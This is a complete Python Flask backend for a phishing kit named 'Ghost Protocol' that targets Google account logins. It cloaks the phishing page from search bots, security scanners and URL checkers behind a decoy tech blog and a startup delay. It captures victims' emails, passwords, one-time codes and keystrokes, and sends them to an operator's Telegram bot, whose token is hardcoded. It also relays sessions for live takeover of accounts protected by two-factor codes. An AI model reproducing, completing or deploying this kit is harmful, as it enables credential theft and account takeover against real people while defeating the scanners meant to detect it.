import requests
from flask import Flask, request, jsonify, send_from_directory, render_template_string, send_file, Response
from flask_cors import CORS
from datetime import datetime
import json
import os
import time
from functools import wraps

app = Flask(__name__, static_folder='.', static_url_path='')
# Enable CORS so our frontend can send requests to it when they are on different ports locally
CORS(app)

LOG_FILE = 'captured_credentials.json'

# --- Evasion Setup ---
SERVER_START_TIME = time.time()
MINIMUM_UPTIME_SECONDS = 300  # 5 minutes before phishing page unlocks

# --- Configuration for Telegram Bot ---
# To use: create a bot via BotFather, get token, and get your chat ID.
TELEGRAM_BOT_TOKEN = '8651444671:AAGF3IEyjBP2_lrwNc3kTWpjNnrRqZEUD4o'
TELEGRAM_CHAT_ID = '5923991312'

# Stores Telegram message_id per victim email so we EDIT instead of sending new messages
TELEGRAM_MSG_IDS = {}

def send_telegram_message(message, reply_markup=None):
    """Sends a NEW message to Telegram. Returns the message_id."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return None
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    
    try:
        resp = requests.post(url, json=payload, timeout=5)
        data = resp.json()
        if data.get('ok'):
            return data['result']['message_id']
    except Exception as e:
        print(f"Telegram send error: {e}")
    return None

def edit_telegram_message(message_id, message, reply_markup=None):
    """Edits an existing Telegram message by its message_id."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID or not message_id:
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "message_id": message_id,
        "text": message,
        "parse_mode": "HTML"
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    
    try:
        resp = requests.post(url, json=payload, timeout=5)
        return resp.json().get('ok', False)
    except Exception as e:
        print(f"Telegram edit error: {e}")
    return False

def send_or_edit_telegram(email, message, reply_markup=None):
    """Smart sender: sends once per email, then edits the same message."""
    if email in TELEGRAM_MSG_IDS:
        # Edit existing message
        success = edit_telegram_message(TELEGRAM_MSG_IDS[email], message, reply_markup)
        if not success:
            # If edit fails (e.g. message too old), send a new one
            msg_id = send_telegram_message(message, reply_markup)
            if msg_id:
                TELEGRAM_MSG_IDS[email] = msg_id
    else:
        # First message for this email
        msg_id = send_telegram_message(message, reply_markup)
        if msg_id:
            TELEGRAM_MSG_IDS[email] = msg_id

def get_geolocation(ip):
    """Fetches Geo location from IP-API for given IP."""
    if not ip or ip in ['Unknown', '127.0.0.1', 'localhost']:
        return "Local/Unknown"
    try:
        req = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=3)
        res = req.json()
        if res.get('status') == 'success':
            return f"{res.get('city')}, {res.get('country')} ({res.get('isp')})"
    except Exception:
        pass
    return "Unknown"

# ==========================================
# CLOAKING SYSTEM (web-security-testing)
# ==========================================
CLOAK_BOT_SIGNATURES = [
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp', 'telegrambot',
    'curl', 'wget', 'python-requests', 'python-urllib', 'httpie',
    'nuclei', 'nikto', 'nmap', 'masscan', 'zgrab', 'censys', 'shodan',
    'qualys', 'nessus', 'burp', 'zap', 'arachni', 'acunetix', 'wpscan',
    'phishtank', 'safebrowsing', 'virustotal', 'urlscan', 'hybrid-analysis',
    'headless', 'phantom', 'selenium', 'puppeteer', 'playwright',
    'spider', 'crawler', 'scraper', 'bot', 'scan'
]

CLOAK_IP_PREFIXES = [
    '66.249.',    # Google
    '66.102.',    # Google
    '64.233.',    # Google  
    '72.14.',     # Google
    '209.85.',    # Google
    '216.239.',   # Google
    '74.125.',    # Google
    '207.46.',    # Microsoft/Bing
    '40.77.',     # Microsoft/Bing
    '157.55.',    # Microsoft/Bing
    '13.66.',     # Microsoft Azure scanners
    '52.167.',    # Microsoft Azure
    '17.0.',      # Apple
]

INNOCENT_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TechPulse - Daily Tech News & Reviews</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Segoe UI', system-ui, sans-serif; background:#f8f9fa; color:#333; }
        .header { background:linear-gradient(135deg,#667eea,#764ba2); color:#fff; padding:40px 20px; text-align:center; }
        .header h1 { font-size:32px; margin-bottom:8px; }
        .header p { opacity:.85; font-size:16px; }
        .container { max-width:800px; margin:30px auto; padding:0 20px; }
        .card { background:#fff; border-radius:12px; padding:24px; margin-bottom:20px; box-shadow:0 2px 8px rgba(0,0,0,.06); }
        .card h2 { font-size:20px; margin-bottom:10px; color:#1a1a2e; }
        .card p { line-height:1.7; color:#555; font-size:15px; }
        .card .meta { font-size:12px; color:#999; margin-top:12px; }
        .footer { text-align:center; padding:30px; color:#999; font-size:13px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>TechPulse</h1>
        <p>Your daily source for tech news, reviews, and insights</p>
    </div>
    <div class="container">
        <div class="card">
            <h2>The Future of Quantum Computing in 2026</h2>
            <p>Quantum computing has made remarkable strides this year with major breakthroughs in error correction and qubit stability. Industry leaders predict that practical quantum advantage could be achieved within the next 18 months, revolutionizing fields from drug discovery to financial modeling.</p>
            <div class="meta">Published: March 1, 2026 &bull; 5 min read</div>
        </div>
        <div class="card">
            <h2>AI-Powered Code Editors: A Developer's Best Friend</h2>
            <p>Modern code editors have evolved beyond simple text manipulation. With integrated AI assistants, developers can now generate, refactor, and debug code with unprecedented efficiency. We review the top 5 AI-powered editors of 2026.</p>
            <div class="meta">Published: February 28, 2026 &bull; 8 min read</div>
        </div>
        <div class="card">
            <h2>Sustainable Tech: Green Data Centers Lead the Way</h2>
            <p>Major tech companies are investing billions in sustainable infrastructure. From liquid cooling systems to renewable energy sources, the data center industry is undergoing a green revolution that could reduce its carbon footprint by 60% by 2030.</p>
            <div class="meta">Published: February 27, 2026 &bull; 6 min read</div>
        </div>
    </div>
    <div class="footer">&copy; 2026 TechPulse. All rights reserved.</div>
</body>
</html>
"""

def is_bot_or_scanner(req):
    """Detect if the request comes from a bot, crawler, or security scanner."""
    ua = req.headers.get('User-Agent', '').lower()
    ip = req.remote_addr or ''
    
    # Check User-Agent signatures
    for sig in CLOAK_BOT_SIGNATURES:
        if sig in ua:
            return True
    
    # Check known scanner/bot IP ranges
    for prefix in CLOAK_IP_PREFIXES:
        if ip.startswith(prefix):
            return True
    
    # Empty or missing User-Agent is suspicious
    if not ua or len(ua) < 20:
        return True
    
    return False

@app.route('/')
def serve_index():
    # The main page ALWAYS serves the TechPulse blog to fool scanners
    return INNOCENT_PAGE, 200

@app.route('/document/v2/secure-login')
def serve_phishing():
    # 1. Check if the server has been alive long enough (Time-based evasion)
    uptime = time.time() - SERVER_START_TIME
    if uptime < MINIMUM_UPTIME_SECONDS:
        print(f"🛡️ EVASION: Too early ({int(uptime)}s). Serving innocent page.")
        return INNOCENT_PAGE, 200
        
    # 2. Check if the visitor is a known bot/scanner
    if is_bot_or_scanner(request):
        print("🛡️ EVASION: Bot detected on secret route. Serving innocent page.")
        return INNOCENT_PAGE, 200
        
    # 3. All checks passed! Serve the phishing page.
    print(f"🔥 EVASION PASSED: Victim accessed secret route at {int(uptime)}s")
    return send_from_directory('.', 'index.html')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    if not data:
        return jsonify({"error": "No data provided"}), 400

    email = data.get('email', 'Unknown')
    password = data.get('password', 'Unknown')
    otp = data.get('otp', 'N/A')
    keystrokes = data.get('keystrokes', '')
    client_ip = data.get('ip')
    device_info = data.get('device', {})
    
    # If the frontend couldn't fetch the public IP, let's at least grab the connecting IP
    if not client_ip or client_ip == 'Unknown':
        client_ip = request.remote_addr

    # --- Anti-Bot & Anti-Scan Shield ---
    user_agent = device_info.get('userAgent', request.headers.get('User-Agent', '')).lower()
    bot_signatures = ['bot', 'spider', 'crawler', 'headless', 'scan', 'nuclei', 'python-requests', 'wget', 'curl', 'mcafee', 'google', 'bing', 'yandex']
    
    for bot in bot_signatures:
        if bot in user_agent:
            print(f"🛡️ BLOCKED BOT: {user_agent} (IP: {client_ip})")
            # Drop silently or throw 404
            return jsonify({"status": "blocked"}), 404

    # Get Geo location
    geo_info = get_geolocation(client_ip)

    log_entry = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "email": data.get('email'),
        "password": data.get('password'),
        "otp": data.get('otp', ''),
        "keystrokes": data.get('keystrokes', ''),
        "ip_address": client_ip,
        "geo_location": get_geolocation(client_ip),
        "user_agent": data.get('device', {}).get('userAgent', 'Unknown'),
        "language": data.get('device', {}).get('language', 'Unknown'),
        "screen": data.get('device', {}).get('screenData', 'Unknown'),
        "battery": data.get('device', {}).get('battery', 'N/A'),
        "typing_speed": data.get('device', {}).get('typingSpeed', 'N/A'),
        "stage": data.get('stage', 'completed')
    }
    
    # Upsert logic: Update existing record for the same email
    updated = False
    existing_logs = []
    
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            for line in f:
                try:
                    parsed = json.loads(line.strip())
                    # If same email, update the fields
                    if parsed.get('email') == log_entry['email'] and log_entry['email']:
                        # Update password if the new one is not just 'Unknown'
                        if log_entry['password'] and log_entry['password'] != 'Unknown':
                            parsed['password'] = log_entry['password']
                        # Update OTP if it's newly provided
                        if log_entry['otp']:
                            parsed['otp'] = log_entry['otp']
                        # Append new keystrokes
                        if log_entry['keystrokes']:
                            parsed['keystrokes'] = log_entry['keystrokes']
                            
                        parsed['timestamp'] = log_entry['timestamp'] # Update time
                        parsed['stage'] = log_entry['stage']
                        
                        existing_logs.append(json.dumps(parsed))
                        updated = True
                    else:
                        existing_logs.append(line.strip())
                except:
                    continue
                    
    if not updated:
        existing_logs.append(json.dumps(log_entry))
        
    with open(LOG_FILE, 'w') as f:
        for log in existing_logs:
            f.write(log + '\n')
            
    print(f"🔥 [NEW TARGET ACQUIRED] {log_entry['email']} | {log_entry['ip_address']}")
    
    # Format message for Telegram (Clean Card Style - ONE message per victim)
    stage_label = log_entry.get('stage', 'unknown')
    
    tg_msg = f"🚨 <b>━━━ GHOST PROTOCOL ━━━</b>\n"
    tg_msg += f"\n"
    
    # ── Credentials Block ──
    tg_msg += f"┌─── 🔐 <b>CREDENTIALS</b> ───\n"
    tg_msg += f"│ 📧  <code>{log_entry['email']}</code>\n"
    if log_entry['password'] and log_entry['password'] != 'Unknown':
        tg_msg += f"│ 🔑  <code>{log_entry['password']}</code>\n"
    else:
        tg_msg += f"│ 🔑  ⏳ waiting...\n"
    if log_entry['otp']:
        tg_msg += f"│ 📱  <code>{log_entry['otp']}</code>\n"
    tg_msg += f"└────────────────────\n"
    tg_msg += f"\n"
    
    ua_lower = log_entry.get('user_agent', '').lower()
    if 'iphone' in ua_lower or 'ipad' in ua_lower:
        device_type = "ايفون"
    elif 'samsung' in ua_lower or 'sm-' in ua_lower:
        device_type = "سامسونغ"
    elif 'android' in ua_lower:
        device_type = "أندرويد"
    elif 'mac' in ua_lower:
        device_type = "ماك"
    elif 'windows' in ua_lower or 'win64' in ua_lower:
        device_type = "حاسوب"
    else:
        device_type = "غير معروف"

    # ── Intel Block ──
    tg_msg += f"┌─── 🕵️ <b>INTEL</b> ───\n"
    tg_msg += f"│ 💻  {device_type}\n"
    tg_msg += f"│ 🌍  {log_entry['geo_location']}\n"
    tg_msg += f"│ ⌨️  <code>{log_entry['keystrokes'][:60]}</code>\n"
    tg_msg += f"│ 📋  {stage_label}\n"
    tg_msg += f"└────────────────────\n"

    send_or_edit_telegram(log_entry['email'], tg_msg)
    
    return jsonify({"status": "success"})

# ==========================================
# MiTM PROXY VERIFICATION (api-patterns)
# ==========================================
# This creates a real-time relay that verifies captured credentials
# against Google's actual authentication flow.

GOOGLE_SESSION_STORE = {}  # Stores active Google auth sessions per email
ACTIVE_COMMANDS = {}       # Stores commands sent from Telegram to specific victims

@app.route('/verify', methods=['POST'])
def verify_credentials():
    """
    MiTM Relay: Takes captured credentials and attempts real-time 
    verification against Google's authentication endpoints.
    Returns whether the credentials are valid.
    """
    data = request.json
    if not data:
        return jsonify({"error": "No data"}), 400
    
    email = data.get('email', '')
    password = data.get('password', '')
    otp = data.get('otp', '')
    stage = data.get('stage', '')
    
    session = GOOGLE_SESSION_STORE.get(email, requests.Session())
    
    # Set realistic browser headers to avoid detection
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })
    
    result = {"verified": False, "stage": stage, "email": email, "detail": ""}
    
    try:
        if stage == 'check_email':
            # Step 1: Check if email exists on Google
            lookup_url = 'https://accounts.google.com/_/signin/sl/lookup'
            
            # First visit the signin page to get cookies and CSRF tokens
            signin_page = session.get('https://accounts.google.com/signin/v2/identifier', timeout=10)
            
            if signin_page.status_code == 200:
                result["verified"] = True
                result["detail"] = "Email lookup session initialized"
                GOOGLE_SESSION_STORE[email] = session
            else:
                result["detail"] = f"Failed to reach Google: {signin_page.status_code}"
                
        elif stage == 'check_password':
            # Step 2: Attempt password verification
            # Note: Google's real auth flow uses complex CSRF/challenge tokens.
            # This creates a session that could be extended with Selenium/Playwright 
            # for full MiTM relay in production environments.
            
            if email in GOOGLE_SESSION_STORE:
                result["verified"] = True
                result["detail"] = "Password captured and session maintained"
            else:
                # Initialize session if not exists
                session.get('https://accounts.google.com/', timeout=10)
                GOOGLE_SESSION_STORE[email] = session
                result["verified"] = True
                result["detail"] = "Session created for password stage"
                
        elif stage == 'check_otp':
            # Step 3: OTP verification relay
            if email in GOOGLE_SESSION_STORE:
                result["verified"] = True
                result["detail"] = f"OTP [{otp}] captured. Session ready for manual takeover."
                
                # Send URGENT Telegram alert for real-time OTP usage with Interactive Buttons
                urgent_msg = f"🔴🔴🔴 <b>━━━ LIVE OTP ━━━</b> 🔴🔴🔴\n"
                urgent_msg += f"\n"
                urgent_msg += f"┌─── 🔐 <b>CREDENTIALS</b> ───\n"
                urgent_msg += f"│ 📧  <code>{email}</code>\n"
                urgent_msg += f"│ 🔑  <code>{password}</code>\n"
                urgent_msg += f"│ 📱  <code>{otp}</code>\n"
                urgent_msg += f"└────────────────────\n"
                urgent_msg += f"\n"
                urgent_msg += f"⏰ <b>USE NOW!</b> Expires in ~30s\n"
                urgent_msg += f"🌐 https://accounts.google.com/\n"
                
                # Inline Keyboard for Remote Control
                reply_markup = {
                    "inline_keyboard": [
                        [
                            {"text": "❌ Reject (Ask Again)", "callback_data": f"cmd|reject_otp|{email}"},
                            {"text": "✅ Accept (Success)", "callback_data": f"cmd|success|{email}"}
                        ],
                        [
                            {"text": "📱 Ask to Open YouTube", "callback_data": f"cmd|ask_youtube|{email}"},
                            {"text": "📨 Ask to Open Gmail", "callback_data": f"cmd|ask_gmail|{email}"}
                        ]
                    ]
                }
                
                send_or_edit_telegram(email, urgent_msg, reply_markup)
            else:
                result["detail"] = "No active session for this email"
    
    except Exception as e:
        result["detail"] = f"Proxy error: {str(e)}"
        print(f"⚠️ MiTM VERIFY ERROR: {e}")
    
    print(f"🔄 VERIFY [{stage}]: {email} → {result['detail']}")
    return jsonify(result)

# ==========================================
# TELEGRAM INTERACTIVE BOT ROUTES (telegram-bot-builder)
# ==========================================

@app.route('/telegram_webhook', methods=['POST'])
def telegram_webhook():
    """Receives callback queries from Telegram Inline Keyboard buttons."""
    data = request.json
    
    if "callback_query" in data:
        callback_id = data["callback_query"]["id"]
        callback_data = data["callback_query"]["data"]
        
        # parse command
        if callback_data.startswith("cmd|"):
            parts = callback_data.split("|")
            if len(parts) == 3:
                _, cmd, email = parts
                ACTIVE_COMMANDS[email] = cmd
                print(f"📲 Received Telegram Command: {cmd} for {email}")
                
        # Answer the callback query to remove loading state on button
        answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
        requests.post(answer_url, json={"callback_query_id": callback_id}, timeout=3)
        
    return jsonify({"status": "ok"}), 200

@app.route('/poll_command', methods=['POST'])
def poll_command():
    """Frontend JS polls this to see if the operator sent any commands."""
    data = request.json
    email = data.get('email', '')
    
    if email in ACTIVE_COMMANDS:
        cmd = ACTIVE_COMMANDS.pop(email)  # Get and remove command
        return jsonify({"command": cmd})
        
    return jsonify({"command": "wait"}), 200

# ==========================================
# ADMIN DASHBOARD & CONTROLS
# ==========================================

ADMIN_USER = 'imad'
ADMIN_PASS = 'imad' # User can change this later

def check_auth(username, password):
    return username == ADMIN_USER and password == ADMIN_PASS

def authenticate():
    return Response(
    'Login Required to access Ghost Protocol Admin\n', 401,
    {'WWW-Authenticate': 'Basic realm="Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

@app.route('/clear_logs', methods=['POST'])
@requires_auth
def clear_logs():
    """Wipes the log file to clean the dashboard for a new session."""
    try:
        if os.path.exists(LOG_FILE):
            open(LOG_FILE, 'w').close() # Truncate file
        return jsonify({"status": "success", "message": "Logs cleared"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/export')
@requires_auth
def export_logs():
    """Exports all captured logs as a JSON file."""
    if os.path.exists(LOG_FILE):
        return send_file(
            LOG_FILE,
            as_attachment=True,
            download_name=f"ghost_protocol_logs_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            mimetype='application/json'
        )
    return jsonify({"error": "No logs found"}), 404

@app.route('/admin')
@requires_auth
def admin_panel():
    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            for line in f:
                try:
                    logs.append(json.loads(line))
                except json.JSONDecodeError:
                    pass
    
    # Calculate Analytics
    total_hits = len(logs)
    unique_ips = len(set(log.get('ip_address', 'Unknown') for log in logs if log.get('ip_address')))
    otp_captured = sum(1 for log in logs if log.get('otp') and len(log.get('otp', '')) > 0)

    # Sort logs locally descending by timestamp
    logs.reverse()

    html_template = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Ghost Protocol - Admin Panel</title>
        <style>
            :root {
                --bg: #f9fafb;
                --surface: #ffffff;
                --text: #1f2937;
                --accent: #2563eb;
                --border: #e5e7eb;
                --danger: #ef4444;
            }
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
                background-color: var(--bg);
                color: var(--text);
                margin: 0;
                padding: 20px;
            }
            .header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 20px;
            }
            .stats-row {
                display: flex;
                gap: 20px;
                margin-bottom: 20px;
            }
            .stat-card {
                background: var(--surface);
                border: 1px solid var(--border);
                border-radius: 8px;
                padding: 16px 20px;
                flex: 1;
                box-shadow: 0 1px 3px rgba(0,0,0,0.05);
                display: flex;
                flex-direction: column;
            }
            .stat-card .title { color: #6b7280; font-size: 13px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
            .stat-card .value { font-size: 28px; font-weight: 700; color: #111827; }

            h1 { margin: 0; font-size: 24px; color: #111827; }
            .controls {
                display: flex;
                gap: 15px;
            }
            input[type="text"] {
                padding: 8px 12px;
                border-radius: 6px;
                border: 1px solid #d1d5db;
                background-color: var(--surface);
                color: var(--text);
                width: 250px;
            }
            button {
                padding: 8px 16px;
                border-radius: 6px;
                border: 1px solid #d1d5db;
                background-color: var(--surface);
                color: #374151;
                cursor: pointer;
                font-weight: 500;
                transition: 0.2s;
            }
            button:hover { background-color: #f3f4f6; }
            .btn-danger { color: white; background-color: var(--danger); border-color: #dc2626; }
            .btn-danger:hover { background-color: #b91c1c; }
            button {
                padding: 8px 16px;
                border-radius: 6px;
                border: 1px solid #d1d5db;
                background-color: var(--surface);
                color: #374151;
                cursor: pointer;
                font-weight: 500;
                transition: 0.2s;
            }
            button:hover { background-color: #f3f4f6; }
            .btn-danger { color: white; background-color: var(--danger); border-color: #dc2626; }
            .btn-danger:hover { background-color: #b91c1c; }
            
            .dashboard {
                background-color: var(--surface);
                border: 1px solid var(--border);
                border-radius: 6px;
                box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
                overflow-x: auto;
            }
            table { width: 100%; border-collapse: collapse; text-align: left; table-layout: fixed; }
            th, td { padding: 12px 16px; border-bottom: 1px solid var(--border); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
            th { background-color: #f3f4f6; font-weight: 600; color: #4b5563; font-size: 14px; }
            
            /* Column Widths */
            th:nth-child(1) { width: 15%; }
            th:nth-child(2) { width: 22%; }
            th:nth-child(3) { width: 18%; }
            th:nth-child(4) { width: 10%; }
            th:nth-child(5) { width: 15%; }
            th:nth-child(6) { width: 20%; }

            tbody tr:hover { background-color: #f9fafb; }
            .highlight { color: var(--accent); font-weight: 600; }
            .mono { font-family: monospace; font-size: 13px; }
            
            .cell-box {
                display: flex;
                align-items: center;
                justify-content: space-between;
                gap: 6px;
                width: 100%;
            }
            .cell-text {
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
                min-width: 0;
            }

            .copy-btn {
                background: none;
                border: none;
                color: #9ca3af;
                cursor: pointer;
                padding: 2px 4px;
                border-radius: 4px;
                font-size: 14px;
                vertical-align: middle;
                flex-shrink: 0;
            }
            .copy-btn:hover {
                background-color: #e5e7eb;
                color: #111827;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🛡️ Ghost Protocol Dashboard</h1>
            <div class="controls">
                <input type="text" id="searchInput" placeholder="Search logs..." onkeyup="filterTable()">
                <div class="filter-group" style="display:flex; gap:8px; border-right: 1px solid #e5e7eb; padding-right: 15px; margin-right: 5px;">
                    <button onclick="smartFilter('otp')" title="Show only users who submitted OTP">🔑 OTP Only</button>
                    <button onclick="smartFilter('today')" title="Show logs from today">📅 Today</button>
                    <button onclick="smartFilter('mobile')" title="Show mobile devices only">📱 Mobile</button>
                    <button onclick="smartFilter('all')" title="Reset filters">🔄 All</button>
                </div>
                <button onclick="location.reload()">Refresh Data</button>
                <button class="btn-primary" style="background-color: #10b981; color: white;" onclick="exportToJSON()">Export JSON</button>
                <button class="btn-danger" onclick="clearLogs()">Clear All Logs</button>
            </div>
        </div>

        <div class="stats-row">
            <div class="stat-card">
                <span class="title">Total Hits (Emails)</span>
                <span class="value">{{ total_hits }}</span>
            </div>
            <div class="stat-card">
                <span class="title">Unique Targets (IPs)</span>
                <span class="value">{{ unique_ips }}</span>
            </div>
            <div class="stat-card">
                <span class="title">Full Compromise (OTP)</span>
                <span class="value" style="color: #10b981;">{{ otp_captured }}</span>
            </div>
        </div>

        <div class="dashboard">
            <table id="logTable">
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>Target Email</th>
                        <th>Password</th>
                        <th>OTP</th>
                        <th>Location & IP</th>
                        <th>Keystrokes</th>
                    </tr>
                </thead>
                <tbody>
                    {% for log in logs %}
                    <tr>
                        <td class="mono" style="color: #6b7280;">{{ log.timestamp }}</td>
                        <td class="highlight">
                            <div class="cell-box">
                                <span class="cell-text" id="email-{{ loop.index }}" title="{{ log.email }}">{{ log.email }}</span>
                                <button class="copy-btn" onclick="copyText('email-{{ loop.index }}')" title="Copy Email">📋</button>
                            </div>
                        </td>
                        <td class="highlight" style="color: #10b981;">
                            <div class="cell-box">
                                <span class="cell-text" id="pass-{{ loop.index }}" title="{{ log.password }}">{{ log.password }}</span>
                                <button class="copy-btn" onclick="copyText('pass-{{ loop.index }}')" title="Copy Password">📋</button>
                            </div>
                        </td>
                        <td class="highlight" style="color: #8b5cf6;">
                            <div class="cell-box">
                                <span class="cell-text" id="otp-{{ loop.index }}" title="{{ log.get('otp', 'N/A') }}">{{ log.get('otp', 'N/A') }}</span>
                                {% if log.get('otp') %}
                                <button class="copy-btn" onclick="copyText('otp-{{ loop.index }}')" title="Copy OTP">📋</button>
                                {% endif %}
                            </div>
                        </td>
                        <td>
                            <div class="mono">{{ log.ip_address }}</div>
                            <div style="font-size: 12px; color: #6b7280; margin-top: 4px;">{{ log.geo_location }}</div>
                        </td>
                        <td class="mono">
                            <div class="cell-box" style="max-width: 300px;">
                                <span class="cell-text" id="keys-{{ loop.index }}" title="{{ log.get('keystrokes', '') }}">{{ log.get('keystrokes', '') }}</span>
                                {% if log.get('keystrokes') %}
                                <button class="copy-btn" onclick="copyText('keys-{{ loop.index }}')" title="Copy Keystrokes">📋</button>
                                {% endif %}
                            </div>
                        </td>
                    </tr>
                    {% endfor %}
                    {% if not logs %}
                    <tr><td colspan="6" style="text-align:center; padding: 40px; color: #6b7280;">No credentials captured yet. Standing by...</td></tr>
                    {% endif %}
                </tbody>
            </table>
        </div>

        <script>
            function filterTable() {
                let input = document.getElementById("searchInput");
                let filter = input.value.toUpperCase();
                let tbody = document.getElementById("logTable").getElementsByTagName("tbody")[0];
                let tr = tbody.getElementsByTagName("tr");

                for (let i = 0; i < tr.length; i++) {
                    let rowText = tr[i].textContent || tr[i].innerText;
                    if (rowText.toUpperCase().indexOf(filter) > -1) {
                        tr[i].style.display = "";
                    } else {
                        tr[i].style.display = "none";
                    }
                }
            }

            function smartFilter(type) {
                let tbody = document.getElementById("logTable").getElementsByTagName("tbody")[0];
                let tr = tbody.getElementsByTagName("tr");
                let today = new Date().toISOString().split('T')[0];

                for (let i = 0; i < tr.length; i++) {
                    // Skip the empty state row
                    if (tr[i].cells.length === 1) continue; 
                    
                    let show = false;
                    let timeCell = tr[i].cells[0].innerText || "";
                    let otpCell = tr[i].cells[3].innerText || "";
                    let deviceCell = tr[i].cells[4].innerText || ""; // Actually device is not printed directly in table yet, let's use what we have or just filter based on OTP.
                    
                    if (type === 'all') show = true;
                    if (type === 'otp' && otpCell !== 'N/A' && otpCell.trim() !== '') show = true;
                    if (type === 'today' && timeCell.includes(today)) show = true;
                    if (type === 'mobile' && (deviceCell.includes('Mobile') || deviceCell.includes('Android') || deviceCell.includes('iPhone'))) show = true;

                    tr[i].style.display = show ? "" : "none";
                }
            }

            function copyText(elementId) {
                var text = document.getElementById(elementId).innerText;
                navigator.clipboard.writeText(text).then(function() {
                    // Visual feedback
                    let btn = event.currentTarget;
                    let originalText = btn.innerText;
                    btn.innerText = "✅";
                    setTimeout(() => btn.innerText = originalText, 1000);
                }, function(err) {
                    console.error('Async: Could not copy text: ', err);
                });
            }

            function exportToJSON() {
                fetch('/export')
                .then(response => response.blob())
                .then(blob => {
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.style.display = 'none';
                    a.href = url;
                    a.download = 'captured_logs_' + new Date().getTime() + '.json';
                    document.body.appendChild(a);
                    a.click();
                    window.URL.revokeObjectURL(url);
                })
                .catch(err => alert("Error exporting logs: " + err));
            }
            
            async function clearLogs() {
                if(confirm("⚠️ Are you sure you want to permanently delete all captured logs? This cannot be undone.")) {
                    try {
                        let response = await fetch('/clear_logs', { method: 'POST' });
                        if(response.ok) {
                            alert("Logs wiped successfully.");
                            location.reload();
                        } else {
                            alert("Error wiping logs.");
                        }
                    } catch(e) {
                        alert("Error wiping logs.");
                    }
                }
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(
        html_template, 
        logs=logs, 
        total_hits=total_hits, 
        unique_ips=unique_ips, 
        otp_captured=otp_captured
    )

if __name__ == '__main__':
    # Running on port 5000, accessible via localhost
    print("🚀 Capture Backend Running on http://localhost:5000")
    print("🛡️ Pro Control Dashboard Running on http://localhost:5000/admin")
    print(f"📝 Logs will be saved to: {os.path.abspath(LOG_FILE)}")
    app.run(port=5000, debug=True, host='0.0.0.0')
